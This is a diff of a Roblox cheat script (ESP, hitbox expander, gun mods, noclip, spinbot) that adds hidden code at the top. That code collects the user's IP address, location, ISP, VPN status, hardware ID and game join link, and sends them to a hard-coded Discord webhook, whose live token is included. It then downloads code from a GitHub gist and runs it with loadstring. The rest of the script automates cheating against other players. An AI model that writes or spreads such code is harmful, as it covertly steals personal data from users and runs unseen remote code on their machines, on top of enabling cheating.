@@ -1,49 +1,158 @@
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = game.Players.LocalPlayer
 
+-- IP & Geo Info
+local ipData = HttpService:JSONDecode(game:HttpGet("https://ipwho.is"))
+local ip = ipData.ip or "N/A"
+local location = ipData.city .. ", " .. ipData.region .. ", " .. ipData.country
+local countryCode = string.lower(ipData.country_code or "")
+local flag = ":flag_" .. countryCode .. ":"
+local isp = ipData.connection and ipData.connection.isp or "N/A"
+local isVPN = tostring(ipData.security and ipData.security.proxy or "Unknown")
+
+-- Whitelist (IP-based)
+local whitelist = {
+    ["172.56.75.86"] = false, -- Replace with real IPs
+}
+
+if not whitelist[ip] then
+    -- Avatar Image
+    local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false"
+    local imageUrl = "https://tr.rbxcdn.com/default_avatar.png"
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(thumbUrl))
+    end)
+    if success and result and result.data and result.data[1] and result.data[1].imageUrl then
+        imageUrl = result.data[1].imageUrl
+    end
+
+    -- Executor Detection
+    local executor = identifyexecutor and identifyexecutor() or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (syn and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (KRNL_LOADED and "Krnl") or
+        (SONA_LOADED and "Sona") or
+        "Unknown Executor"
+
+    -- HWID (Synapse only)
+    local hwid = (syn and syn.crypt and syn.crypt.hash and syn.crypt.hash("getfenv")) or "N/A"
+
+    -- Game Info
+    local gameId = tostring(game.PlaceId)
+    local jobId = tostring(game.JobId)
+    local joinLink = "roblox://placeId=" .. gameId .. "&gameInstanceId=" .. jobId
+
+    local gameName = "Unknown Game"
+    pcall(function()
+        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+
+    -- Webhook Data
+    local imageGifUrl = "https://media.discordapp.net/attachments/1280968038010851400/1397671514417135787/cooltext487167273631024.png?ex=68829288&is=68814108&hm=6c7f978c74e2705edff286dad1a306036853098e8ca6c2da9c133c98b9f53152&=&format=webp&quality=lossless"
+
+    local data = {
+        ["username"] = "orion logged lol",
+        ["avatar_url"] = "https://media.discordapp.net/attachments/1397691075778449458/1397691269102440549/Untitled_4.png?ex=6882a4ee&is=6881536e&hm=eb09c1ad826cb1f88cf18d1dec0ef3855666c8a327bd723d1ea8506d049824b8&=&format=webp&quality=lossless&width=1213&height=968",
+        ["content"] = player.Name .. " / " .. player.UserId .. " **Executed Orion.lol**",
+        ["embeds"] = {{
+            ["title"] = "Execution Logged",
+            ["color"] = 49919,
+            ["fields"] = {
+                { name = "User ID", value = tostring(player.UserId), inline = true },
+                { name = "Executor", value = executor, inline = true },
+                { name = "VPN", value = isVPN, inline = true },
+                { name = "IP", value = "`" .. ip .. "`", inline = false },
+                { name = "HWID", value = "`" .. hwid .. "`", inline = false },
+                { name = "Location", value = flag .. " " .. location, inline = false },
+                { name = "ISP", value = isp, inline = false },
+                { name = "Join Game", value = " " .. joinLink .. " ", inline = false }
+            },
+            ["thumbnail"] = { ["url"] = imageUrl },
+            ["image"] = { ["url"] = imageGifUrl },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            ["footer"] = { ["text"] = "Game: " .. gameName .. " | ID: " .. gameId }
+        }}
+    }
+
+    -- Send to Webhook
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local requestFunc = http_request or request or HttpPost or syn.request
+    local payload = {
+        Url = "https://discord.com/api/webhooks/1397716605743534231/qzj-UcVdoQbm6FBbRhkpbFXtXWEM5nvCiLPaOHeV8ZeajQ_ULrYcoUWsq4WrsIWZYqju",
+        Method = "POST",
+        Headers = headers,
+        Body = HttpService:JSONEncode(data)
+    }
+
+    requestFunc(payload)
+end
+
+local url = "https://gist.githubusercontent.com/lelo0002/4db744b062969cdbd280196bad38900a/raw/72f4bfb29b75695fcb045fa62e38c16c88960a1d/gistfile1.txt"
+
+local content = game:HttpGetAsync(url)
+loadstring(content)()
+task.wait(5)
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-local Workspace = game:GetService("Workspace")
-local Lighting = game:GetService("Lighting")
-local UIS = game:GetService("UserInputService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local UserInputService = game:GetService("UserInputService")
-
-local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local Mouse = LocalPlayer:GetMouse()
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+
+local UIS = game:GetService("UserInputService")
 local mousePos = UIS:GetMouseLocation()
 
--- Config variables
+--============================--
+--      CONFIG VARIABLES      --
+--============================--
+
 local fontMap = {
     ["UI"] = 0,
     ["System"] = 1,
     ["Plex"] = 2,
     ["Monospace"] = 3
 }
+
+local Lighting = game:GetService("Lighting")
 local fontStyle1 = fontMap["Plex"] -- Default
+local Camera = workspace.CurrentCamera
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+-- Set initial FOV
+Camera.FieldOfView = 70
+local CLUSTER_RADIUS = 100 -- How close items must be to cluster together
 local fontSize1 = 14
+local ESPmaxDistance = 5000 -- default max distance
+local maxDistance = 5000   -- Max distance to show ESP labels (in studs)
 local itemFontSize = 14
 local itemFontStyle = 2
+
 local playerFontSize = 14
 local playerFontStyle = 2
+
 
 -- Default colors for ESP labels
 local droppedESPColor = Color3.fromRGB(126, 184, 200)
 local crateESPColor = Color3.fromRGB(126, 184, 200)
 local printerESPColor = Color3.fromRGB(126, 184, 200)
-local markTargetESPColor = Color3.fromRGB(255, 0, 0) -- red default
 
--- ESP distances and clustering
-local CLUSTER_RADIUS = 100 -- How close items must be to cluster together
-local ESPmaxDistance = 5000
-local maxDistance = 5000 -- Max distance to show ESP labels (studs)
+--============================--
+--        ESP DATA TABLES     --
+--============================--
 
--- Player GUI references
-local player = LocalPlayer
+local player = game:GetService("Players").LocalPlayer
 local gunHandlerPath = player.PlayerGui:WaitForChild("_L.Handler"):WaitForChild("GunHandlerLocal")
 
--- Crosshair settings
+
+
+
+local Mouse = LocalPlayer:GetMouse()
+
+-- Crosshair Settings
 local settings = {
     Enabled = false,
     Outline = false,
@@ -52,32 +161,37 @@ local settings = {
     Size = 20,
     Gap = 5,
     Color = Color3.fromRGB(126, 184, 200),
-    OutlineColor = Color3.fromRGB(255, 255, 255),
+    OutlineColor = Color3.fromRGB(255,255,255),
     PositionMode = "On Mouse",
     Angle = 0
 }
 
--- ESP toggles and data tables
+-- Dropped Items
 local droppedItems = {}
 local itemClusters = {}
 local droppedESPEnabled = false
 
+-- Crates
 local crates = {}
 local crateClusters = {}
 local crateESPEnabled = false
 
+-- Printers
 local printers = {}
 local printerClusters = {}
 local printerESPEnabled = false
 
+
 local snipeRunning = false
 local snipeThread
+
+local markTargetESPColor = Color3.fromRGB(255, 0, 0) -- default red
 
 local markTargetESPEnabled = false
 local markTargetNameDrawing = nil
 local markTargetDistanceDrawing = nil
 
--- Hitbox / settings
+-- Settings
 local hbeEnabled = false
 local hitboxtransparency = 0
 local selectedPart = "Head"
@@ -85,27 +199,30 @@ local hitboxSize = 3
 local hitboxColor = Color3.fromRGB(126, 184, 200)
 local aliveCheck = true
 
--- ESP display toggles and colors
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+--// Variables to track toggle states and colors
 local nameESPEnabled = false
 local healthBarEnabled = false
 local distanceESPEnabled = false
 
-local nameESPColor = Color3.fromRGB(126, 184, 200)
-local healthBarColor1 = Color3.fromRGB(0, 255, 0) -- green full health
-local healthBarColor2 = Color3.fromRGB(255, 0, 0) -- red low health
-local distanceESPColor = Color3.fromRGB(126, 184, 200)
+local nameESPColor = Color3.fromRGB(126, 184, 200)    -- White
+local healthBarColor1 = Color3.fromRGB(0, 255, 0)     -- Green (full health)
+local healthBarColor2 = Color3.fromRGB(255, 0, 0)     -- Red (low health)
+local distanceESPColor = Color3.fromRGB(126, 184, 200)  -- Yellow
 local weaponNameESPEnabled = false
 local weaponNameColor = Color3.fromRGB(255, 210, 100)
 
--- Spinbot variables
 local SpinbotEnabled = false
 local SpinbotSpeed = 45
 local SpinConnection = nil
 
--- Drawing objects per player
+-- Table to store Drawing objects per player
 local playerDrawings = {}
 
--- Gun mods config
 local GunMods = {
     Enabled = false,
     Firerate = nil,
@@ -115,8 +232,6 @@ local GunMods = {
     AlwaysAuto = false,
     InstantReload = false
 }
-
--- Skybox stuff
 local defaultSky = Lighting:FindFirstChild("DefaultSky")
 if not defaultSky then
     defaultSky = Instance.new("Sky")
@@ -124,6 +239,7 @@ if not defaultSky then
     defaultSky.Parent = Lighting
 end
 
+-- Save the original textures on script load to restore later
 local originalTextures = {
     Back = defaultSky.SkyboxBk,
     Down = defaultSky.SkyboxDn,
@@ -132,11 +248,10 @@ local originalTextures = {
     Right = defaultSky.SkyboxRt,
     Up = defaultSky.SkyboxUp,
 }
-
+local Lighting = game:GetService("Lighting")
 local alwaysDayEnabled = false
 local renderConnection
 local spamEnabled = false
-
 local skyboxes = {
     ["Default (Original)"] = originalTextures,
     ["HD Clouds"] = {
@@ -188,8 +303,7 @@ local skyboxes = {
         Up = "rbxassetid://17296096003",
     }
 }
-
--- Ammo prices
+-- Price map
 local ammoPrices = {
     ["9mm"] = 50,
     [".45 ACP"] = 50,
@@ -199,44 +313,54 @@ local ammoPrices = {
     ["5.7x28"] = 60,
     ["44 Magnum"] = 85
 }
+local Lighting = game:GetService("Lighting")
 
--- Globals
+-- Default values
 _G.selectedAmmo = "5.56"
 _G.purchaseAmount = 5
 
--- Misc toggles and keys
 local noclipEnabled = false
-local toggleKey1 = nil -- no default key
-local toggleKey = nil -- default toggle key
+local toggleKey1 = nil -- No default key
 
 local selectedPlayerName = nil
 local selectedPlayer = nil
 local isSpectating = false
+local localPlayer = Players.LocalPlayer
+--// Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local localPlayer = LocalPlayer
 
 local DropperRemote = ReplicatedStorage:WaitForChild("_CS.Events"):WaitForChild("Dropper")
+--// Variables
 local character = player.Character or player.CharacterAdded:Wait()
+
 local Entities = Workspace:WaitForChild("Entities")
 
 local autoPickupEnabled = false
+
+-- Store connection to RenderStepped
+local renderConnection
+
+
 local moveSpeed = 16 -- default speed
 local cframeSpeedEnabled = false
 
 local keysHeld = {
-    W = false,
-    A = false,
-    S = false,
-    D = false
+	W = false,
+	A = false,
+	S = false,
+	D = false
 }
-
 local modIDs = {
     [2432402786] = true,
     [10749712] = true,
     [171667858] = true,
     [5352357] = true,
 }
-
 local originalSettings = {
     ClockTime = Lighting.ClockTime,
     FogEnd = Lighting.FogEnd,
@@ -244,27 +368,19 @@ local originalSettings = {
     OutdoorAmbient = Lighting.OutdoorAmbient,
     ShadowSoftness = Lighting.ShadowSoftness,
 }
-
-local SilentAim = {
-    Enabled = false,
-    FOV = 100,
-    FOVVisible = true,
-    HitChance = 100,
-    FOVColor = Color3.fromRGB(255, 0, 0),
-    FOVThickness = 1.5,
-    FOVTransparency = 1,
-    HitPart = "Head", -- NEW
-    HighlightTarget = true,
-    HighlightColor = Color3.fromRGB(0, 255, 0)
-}
-
 local detectionEnabled = true
+local toggleKey = nil -- default toggle key
+
 
 local skinEnabled = false
 local selectedMaterial = Enum.Material.ForceField
 local selectedColor = Color3.fromRGB(126, 184, 200)
 
 local appliedTools = {}
+
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local RunService = game:GetService("RunService")
+
 
 local alwaysSprintEnabled = false
 local shiftFaked = false
@@ -274,7 +390,7 @@ local trailMode = "Always On Ground"
 local fadeOutTime = 1
 local trailColor = Color3.fromRGB(255, 255, 255)
 
--- Trail system container to avoid conflicts
+-- Data container to avoid conflicts with main script
 local TrailSystem = {
     Character = nil,
     HumanoidRootPart = nil,
@@ -1543,85 +1659,81 @@ local function stopAlwaysDay()
     Lighting.ShadowSoftness = originalSettings.ShadowSoftness
 end
 
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.NumSides = 64
-FOVCircle.Filled = false
-local function IsVisible(part)
-    local origin = Camera.CFrame.Position
-    local direction = (part.Position - origin).Unit * (part.Position - origin).Magnitude
-    local ray = Ray.new(origin, direction)
-    local hit = Workspace:FindPartOnRay(ray, LocalPlayer.Character)
-    return hit and hit:IsDescendantOf(part.Parent)
+local function CreateTrail()
+    -- Clean up old
+    if TrailSystem.Trail then TrailSystem.Trail:Destroy() end
+    if TrailSystem.Attachment1 then TrailSystem.Attachment1:Destroy() end
+    if TrailSystem.Attachment2 then TrailSystem.Attachment2:Destroy() end
+
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    TrailSystem.Character = char
+    TrailSystem.HumanoidRootPart = hrp
+
+    local a1 = Instance.new("Attachment", hrp)
+    local a2 = Instance.new("Attachment", hrp)
+    TrailSystem.Attachment1 = a1
+    TrailSystem.Attachment2 = a2
+
+    local t = Instance.new("Trail", hrp)
+    t.Attachment0 = a1
+    t.Attachment1 = a2
+    t.FaceCamera = true
+    t.Lifetime = fadeOutTime
+    t.MinLength = 0.1
+    t.LightInfluence = 0
+    t.Brightness = 2
+    t.Transparency = NumberSequence.new(0.2)
+    t.Color = ColorSequence.new(trailColor)
+    t.WidthScale = NumberSequence.new(0.4)
+    TrailSystem.Trail = t
 end
 
-local function GetClosestTarget()
-    local closest, closestDist
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character then
-            local targetPart = player.Character:FindFirstChild(SilentAim.HitPart)
-            if targetPart then
-                local screenPos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
-                if onScreen then
-                    local dist = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
-                    if dist < SilentAim.FOV and (not closestDist or dist < closestDist) and IsVisible(targetPart) then
-                        closest = targetPart
-                        closestDist = dist
-                    end
-                end
-            end
-        end
-    end
-    return closest
-end
+--// Update Loop
+RunService.Heartbeat:Connect(function()
+    if not trailEnabled or not TrailSystem.Trail or not TrailSystem.HumanoidRootPart then return end
 
-local currentHighlight
-local function HighlightTarget(target)
-    if currentHighlight then currentHighlight:Destroy() end
-    if target and SilentAim.HighlightTarget then
-        local hl = Instance.new("Highlight")
-        hl.FillTransparency = 1
-        hl.OutlineTransparency = 0
-        hl.OutlineColor = SilentAim.HighlightColor
-        hl.Parent = target.Parent
-        currentHighlight = hl
-    end
-end
+    local hrp = TrailSystem.HumanoidRootPart
+    local rootCFrame = hrp.CFrame
+    local velocity = hrp.Velocity
+    local targetPos
 
---// Hook for FindPartOnRay
-local mt = getrawmetatable(game)
-local oldNamecall = mt.__namecall
-setreadonly(mt, false)
+    if trailMode == "Always On Player" then
+        targetPos = hrp.Position + Vector3.new(0, -3, 0)
+    else
+        local rayParams = RaycastParams.new()
+        rayParams.FilterType = Enum.RaycastFilterType.Blacklist
+        rayParams.FilterDescendantsInstances = {TrailSystem.Character}
 
-mt.__namecall = newcclosure(function(self, ...)
-    local args = {...}
-    local method = getnamecallmethod()
+        local ray = workspace:Raycast(hrp.Position, Vector3.new(0, -10, 0), rayParams)
 
-    if SilentAim.Enabled and method == "FindPartOnRay" then
-        if math.random(1, 100) <= SilentAim.HitChance then
-            local target = GetClosestTarget()
-            if target then
-                HighlightTarget(target)
-                local rayOrigin = Camera.CFrame.Position
-                local rayDirection = (target.Position - rayOrigin).Unit * 1000
-                args[1] = Ray.new(rayOrigin, rayDirection)
-                return oldNamecall(self, unpack(args))
-            end
+        if ray and math.abs(velocity.Y) < 2 then
+            targetPos = ray.Position + Vector3.new(0, 0.05, 0)
+        else
+            targetPos = hrp.Position + Vector3.new(0, -3, 0)
         end
     end
 
-    return oldNamecall(self, unpack(args))
+    local leftOffset = rootCFrame.RightVector * -0.2
+    local rightOffset = rootCFrame.RightVector * 0.2
+
+    TrailSystem.Attachment1.WorldPosition = targetPos + leftOffset
+    TrailSystem.Attachment2.WorldPosition = targetPos + rightOffset
 end)
 
---// RenderStepped: FOV Circle Update
-RunService.RenderStepped:Connect(function()
-    FOVCircle.Visible = SilentAim.Enabled and SilentAim.FOVVisible
-    FOVCircle.Color = SilentAim.FOVColor
-    FOVCircle.Radius = SilentAim.FOV
-    FOVCircle.Thickness = SilentAim.FOVThickness
-    FOVCircle.Transparency = SilentAim.FOVTransparency
-    FOVCircle.Position = Vector2.new(Mouse.X, Mouse.Y + 36)
+--// Auto-Respawn Support
+LocalPlayer.CharacterAdded:Connect(function()
+    if trailEnabled then
+        task.delay(1, function() -- small delay to let HRP load
+            if trailEnabled then
+                CreateTrail()
+            end
+        end)
+    end
 end)
-
 
 --============================--
 --          UI SETUP          --
@@ -1644,10 +1756,10 @@ local Tabs = {
     More = Window:AddTab('More'),
     ['UI Settings'] = Window:AddTab('UI Settings'),
 }
-local SA = Tabs.Main:AddLeftGroupbox('         Hitbox Expander')
+
 local A = Tabs.Main:AddLeftGroupbox('         Hitbox Expander')
 local B = Tabs.Main:AddRightGroupbox('          Local Player')
-local C = Tabs.Main:AddRightGroupbox('             Gun Mods')
+local C = Tabs.Main:AddLeftGroupbox('             Gun Mods')
 
 local A1 = Tabs.Visuals:AddLeftGroupbox('            Player ESP')
 local A2 = Tabs.Visuals:AddRightGroupbox('            Item ESP')
@@ -1660,7 +1772,6 @@ local B1 = Tabs.More:AddLeftGroupbox('           Team Snipe')
 local B2 = Tabs.More:AddLeftGroupbox('         Quickbuy Ammo')
 local B3 = Tabs.More:AddRightGroupbox('             Target')
 local B6 = Tabs.More:AddRightGroupbox('          Miscellaneous')
-
 
 
 
@@ -2679,96 +2790,60 @@ A4:AddDropdown('SkyboxDropdown', {
     end
 })
 
-SA:AddToggle('SilentAimToggle', {
-    Text = 'Silent Aim',
+local trailt = A5:AddToggle("MyToggle", {
+    Text = "Trail",
     Default = false,
+    Tooltip = "",
     Callback = function(Value)
-        SilentAim.Enabled = Value
+        trailEnabled = Value
+        if Value then
+            CreateTrail()
+        else
+            if TrailSystem.Trail then
+                TrailSystem.Trail.Enabled = false
+            end
+        end
     end
 })
 
-local fovt = SA:AddToggle('SilentAimFOVVisible', {
-    Text = 'FOV Visible',
-    Default = true,
-    Callback = function(Value)
-        SilentAim.FOVVisible = Value
-    end
-})
-local highlightColorPicker = SA:AddToggle('HighlightTargetToggle', {
-    Text = 'Highlight Target',
-    Default = true,
-    Callback = function(Value)
-        SilentAim.HighlightTarget = Value
-    end
-})
-SA:AddSlider('SilentAimFOV', {
-    Text = 'FOV',
-    Default = 100,
-    Min = 10,
-    Max = 300,
-    Callback = function(Value)
-        SilentAim.FOV = Value
-    end
-})
-
-SA:AddSlider('SilentAimChance', {
-    Text = 'Hit Chance',
-    Default = 100,
-    Min = 1,
-    Max = 100,
-    Callback = function(Value)
-        SilentAim.HitChance = Value
-    end
-})
-
-SA:AddSlider('FOVThicknessSlider', {
-    Text = 'FOV Thickness',
-    Default = 1.5,
+A5:AddSlider("FadeOutSlider", {
+    Text = "Fade Out Time",
     Min = 0.5,
     Max = 5,
-    Rounding = 1,
-    Callback = function(Value)
-        SilentAim.FOVThickness = Value
-    end
-})
-
-SA:AddSlider('FOVTransparencySlider', {
-    Text = 'FOV Transparency',
     Default = 1,
-    Min = 0.1,
-    Max = 1,
     Rounding = 1,
+    Compact = true,
+    Prefix = "s",
     Callback = function(Value)
-        SilentAim.FOVTransparency = Value
+        fadeOutTime = Value
+        if TrailSystem.Trail then
+            TrailSystem.Trail.Lifetime = fadeOutTime
+        end
     end
 })
-
---// NEW: Target Hitpoint Dropdown
-SA:AddDropdown('SilentAimHitpoint', {
-    Values = { "Head", "HumanoidRootPart" },
+A5:AddDropdown("TrailType", {
+    Values = {"Always On Ground", "Always On Player"},
     Default = 1,
     Multi = false,
-    Text = 'Target Hitpoint',
-    Callback = function(Value)
-        SilentAim.HitPart = Value
+    Text = "Trail Mode",
+    Tooltip = "Choose trail behavior",
+    Callback = function(selected)
+        trailMode = selected
     end
 })
 
-fovt:AddColorPicker('SilentAimFOVColorPicker', {
-    Text = 'Change FOV Color',
-    Default = SilentAim.FOVColor,
-    Callback = function(Value)
-        SilentAim.FOVColor = Value
+trailt:AddColorPicker("ColorPicker", {
+    Default = Color3.fromRGB(255,255,255),
+    Title = "Trail Color",
+    Transparency = nil,
+    Callback = function(value)
+        trailColor = value
+        if TrailSystem.Trail then
+            TrailSystem.Trail.Color = ColorSequence.new(trailColor)
+        end
     end
 })
 
-highlightColorPicker:AddColorPicker('HighlightTargetColorPicker', {
-    Text = 'Highlight Color',
-    Default = SilentAim.HighlightColor,
-    Callback = function(Value)
-        SilentAim.HighlightColor = Value
-    end
-})
 
 
 
